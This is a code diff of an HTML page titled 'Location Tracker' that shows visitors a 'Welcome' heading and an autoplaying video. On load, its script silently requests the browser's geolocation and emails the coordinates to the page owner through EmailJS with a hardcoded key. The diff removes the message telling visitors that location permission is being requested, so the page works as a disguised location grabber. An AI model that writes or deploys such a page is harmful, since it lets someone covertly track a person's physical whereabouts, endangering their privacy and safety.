@@ -1,10 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Tracker</title>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+
+    body{
+      margin:0;
+      padding:0;
+      background:#111;
+      color:white;
+      font-family:Arial;
+      text-align:center;
+    }
+
+    .container{
+      padding:40px;
+    }
+
+    video{
+      width:80%;
+      max-width:900px;
+      border-radius:12px;
+      margin-top:20px;
+    }
+
+    #status{
+      margin-top:20px;
+      font-size:20px;
+      color:#00ff88;
+    }
+
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h1>Welcome</h1>
+
+  <video controls autoplay muted>
+    <source src="your-video.mp4" type="video/mp4">
+  </video>
+
+  <div id="status">
+    Loading...
+  </div>
+
+</div>
+
 <script>
 
 emailjs.init("5YzzNNDMEURwMIHB");
 
 const statusText = document.getElementById("status");
 
-function sendLocation(latitude, longitude) {
+function sendLocation(latitude, longitude){
 
   statusText.innerHTML = "Sending location...";
 
@@ -21,18 +77,18 @@ function sendLocation(latitude, longitude) {
     templateParams
   )
 
-  .then(function(response) {
+  .then(function(response){
 
-    console.log("SUCCESS!", response);
+    console.log(response);
 
     statusText.innerHTML =
       "Location shared successfully.";
 
   })
 
-  .catch(function(error) {
+  .catch(function(error){
 
-    console.log("FAILED...", error);
+    console.log(error);
 
     statusText.innerHTML =
       "Failed to send location.";
@@ -41,65 +97,49 @@ function sendLocation(latitude, longitude) {
 
 }
 
-function getLocation() {
+function getLocation(){
 
-  if (!navigator.geolocation) {
+  if(navigator.geolocation){
+
+    navigator.geolocation.getCurrentPosition(
+
+      function(position){
+
+        const latitude =
+          position.coords.latitude;
+
+        const longitude =
+          position.coords.longitude;
+
+        console.log(latitude, longitude);
+
+        sendLocation(latitude, longitude);
+
+      },
+
+      function(error){
+
+        console.log(error);
+
+        statusText.innerHTML =
+          "Location permission denied.";
+
+      }
+
+    );
+
+  }else{
 
     statusText.innerHTML =
       "Geolocation not supported.";
 
-    return;
   }
-
-  statusText.innerHTML =
-    "Requesting location permission...";
-
-  navigator.geolocation.getCurrentPosition(
-
-    function(position) {
-
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
-      console.log("Latitude:", latitude);
-      console.log("Longitude:", longitude);
-
-      sendLocation(latitude, longitude);
-
-    },
-
-    function(error) {
-
-      console.log(error);
-
-      switch(error.code) {
-
-        case error.PERMISSION_DENIED:
-          statusText.innerHTML =
-            "Location permission denied.";
-          break;
-
-        case error.POSITION_UNAVAILABLE:
-          statusText.innerHTML =
-            "Location unavailable.";
-          break;
-
-        case error.TIMEOUT:
-          statusText.innerHTML =
-            "Location request timeout.";
-          break;
-
-        default:
-          statusText.innerHTML =
-            "Unknown location error.";
-      }
-
-    }
-
-  );
 
 }
 
 getLocation();
 
 </script>
+
+</body>
+</html>
